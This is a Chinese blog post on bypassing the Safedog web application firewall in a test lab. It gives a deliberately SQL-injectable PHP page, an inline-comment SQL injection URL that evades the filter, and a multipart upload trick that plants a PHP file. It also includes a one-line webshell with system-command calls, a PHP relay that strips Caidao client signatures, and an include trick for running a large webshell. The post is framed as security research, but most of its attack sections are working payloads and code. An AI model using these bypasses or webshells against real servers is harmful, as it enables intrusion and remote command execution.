---
layout:     post
title:      全方位绕过安全狗
category: blog
description: 对安全狗防护的一些绕过方法研究
---

**以前老文章都拿出来回顾一下吧：）**

## 一、前言 ##
安全狗是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现安全狗的一些防护功能，例如SQL注入、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。

## 二、测试环境 ##
本次测试环境为

- 中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72
- 网站安全狗IIS版3.2.08417

## 三、SQL注入绕过 ##
我们先写一个存在SQL注入漏洞的php：

    <?
    $uid = $_REQUEST['id'];
    if(!$conn = @mysql_connect("localhost", "root", "123456"))
    die('<font size=+1>An Error Occured</font><hr>unable to connect to the database.');
    if(!@mysql_select_db("supe",$conn))
    die("<font size=+1>An Error Occured</font><hr>unable to find it at database on your MySQL server.");
    $text = "select * from supe_members where uid=".$uid;
    $rs = mysql_query ($text,$conn);
    while($rom = mysql_fetch_array($rs))
    {
    echo $rom["username"];
    }
    ?>
我用的是supesite的库，可以看到这里是有明显SQL注入漏洞的，当没有安全狗的时候可以成功注入：

![](../images/bypasssafedog/14042107226665.png)

当安装安全狗之后，注入语句会被拦截：

![](../images/bypasssafedog/1404210739981.png)

经过测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/**/是不行的，安全狗也防了这块。但是对内联注释/*!and*/这种不知道为什么安全狗没有拦截。

用下面语句成功绕过SQL注入过滤：

> http://192.168.200.115/inj.php?id=1/\*!and\*/1=2/\*!union\*//\*!select\*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17

![](../images/bypasssafedog/14042107589606.png)

有人说只有POST才可以，但是我测试最新版本的安全狗GET注入也是可以用这种方法绕过的。

## 四、文件上传绕过 ##
安全狗的防上传也是做在WEB层，即分析HTTP协议来防止上传，按照yuange说的安全是一个条件语句，这显然是不符合安全规范的，只检查HTTP并不能保证文件系统层上的问题。

假设有一个上传功能的php：

    <?php
      if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
      else
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";
    if (file_exists("upload/" . $_FILES["file"]["name"]))
      {
    echo $_FILES["file"]["name"] . " already exists. ";
      }
    else
      {
    move_uploaded_file($_FILES["file"]["tmp_name"],
      "upload/" . $_FILES["file"]["name"]);
    echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
      }
    }
    ?>
    <html>
    <body>
    <form action="upload.php" method="post"
    enctype="multipart/form-data">
    <label for="file">Filename:</label>
    <input type="file" name="file" id="file" />
    <br />
    <input type="submit" name="submit" value="Submit" />
    </form>
    </body>
    </html>
然后在安全狗里设置禁止上传.php文件：

![](../images/bypasssafedog/14042108405524.png)

然后通过浏览器上传php会被拦截：

![](../images/bypasssafedog/14042108619309.png)

我们通过burp把上传的HTTP包抓下来，然后自己进行一下修改POST数据。经过了一些实验，直接说结果吧，当增加一处文件名和内容，让两个文件名不一致的时候，成功绕过了安全狗的防护，上传了php文件。原因是安全狗进行文件名匹配时候用的是第一个文件名test.jpg，是复合安全要求的，但是webserver在保存文件的时候却保存了第二个文件名test.php，也就是if(security_check(a)){do(b);}，导致安全检查没有用，php文件已经成功上传了：

![](../images/bypasssafedog/14042120215229.png)

![](../images/bypasssafedog/14042111425829.png)

![](../images/bypasssafedog/1404211143682.png)

这样的上传数据可能是不符合RFC规范的，但是却达到了绕过拦截的目的。结论是每种安全检查一定要在对应的层次做检查，而不能想当然的在WEB层做系统层该做的事情。

## 五、一句话webshell绕过 ##
对于攻击者来说，安全狗很烦人的一点就是传上去的webshell却不能执行。我们就来看看怎么绕过安全狗对一句话webshell的拦截。

首先要知道安全狗防webshell仍然是依靠文件特征+HTTP来判断，但webshell真正执行是在脚本层，检查的层次不对当然也是可以轻易绕过去的。因为php里面函数名都可以是变量，文件里哪还有特征啊，上传如下php：

    <?php
    $_REQUEST['a']($_REQUEST['b']);
    ?>
然后在浏览器里执行：

> http://192.168.200.115/small.php?a=system&b=dir

![](../images/bypasssafedog/14042112336881.png)

成功执行了系统命令，当然也可以执行php代码：

> http://192.168.200.115/small.php?a=assert&b=phpinfo();

![](../images/bypasssafedog/14042112566076.png)

## 六、菜刀绕过 ##
测试发现这种一句话虽然可以成功执行，但是在菜刀里却不能用，而有些人非觉得这样的一句话麻烦，非要用菜刀。经分析安全狗对菜刀的HTTP请求做了拦截，菜刀的POST数据里面对eval数据做了base64编码，安全狗也就依靠对这些特征来拦截，因此要想正常使用菜刀，必须在本地做一个转发，先把有特征的数据转换。这个思路类似于对伪静态注入的本地转发。

首先在本地搭建WEB SERVER，然后写一个php转发程序：

    <?php
    $target="http://192.168.200.115/small.php";//这个就是前面那个一句话的地址
    $poststr='';
    $i=0;
    foreach($_POST as $k=>$v)
    {
      if(strstr($v, "base64_decode"))
      {
    $v=str_replace("base64_decode(","",$v);
    $v=str_replace("))",")",$v);
      }
      else
      {
    if($k==="z0")
      $v=base64_decode($v);
      }
      $pp=$k."=".urlencode($v);
      //echo($pp);
      if($i!=0)
      {
    $poststr=$poststr."&".$pp;
      }
      else
      {  
    $poststr=$pp;
      }
      $i=$i+1;
    }
    $ch = curl_init();
    $curl_url = $target."?".$_SERVER['QUERY_STRING'];
    curl_setopt($ch, CURLOPT_URL, $curl_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $poststr);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    echo $result;
    ?>
意思就是在本地先对eval数据进行base64解码，然后再POST到目标机器上去。在菜刀里设置URL为本地转发php脚本:

![](../images/bypasssafedog/14042113256728.png)


这样就可以使用菜刀来连接前面那个一句话马了:

![](../images/bypasssafedog/14042113407099.png)

这样就能用菜刀了，不过大家真的没必要执着于菜刀，向大家推荐一款更好的类似菜刀的工具Altman：

[http://www.i0day.com/1725.html](http://www.i0day.com/1725.html)

它的最大特点是开源，这意味着像安全狗这种根据特征来拦截的，只要改改源代码把特征字符串改掉，就永远也无法拦截。当然改这个代码要你自己动手喽。

## 七、webshell大马绕过 ##
一句话功能毕竟有限，想用大马怎么办？仍然是传统的include大法，传一个big.php内容如下：

    <?php
    include('logo.txt');
    ?>
然后再把大马上传为logo.txt，这样就成功绕过安全狗的拦截执行了webshell：

![](../images/bypasssafedog/14042114287275.png)

这样大马也顺利执行了。

## 八、结束语 ##
上面从SQL注入、上传、webshell等几个方面绕过了安全狗的保护，有些绕过方法安全狗可能早就知道了，但是为什么一直没有补？很可能的原因是怕过滤太严格影响某些应用，在安全和通用性之间做取舍我认为是可以理解的，但是我觉得这也正是安全研究人员存在的价值所在。

这里发几句题外的牢骚，很多安全公司其实是当作软件公司来做的，做安全软件就是去做开发，而忽视了安全研究的价值。普通的防护方法原理很简单，但想要不影响应用又保证安全其实很难，如果没有对漏洞和攻击有深入理解的研究人员，安全产品是没法更上一层楼的。希望各个安全公司不要太功利，对研究人员多一些重视，安全公司真的不能仅仅等同于软件公司啊！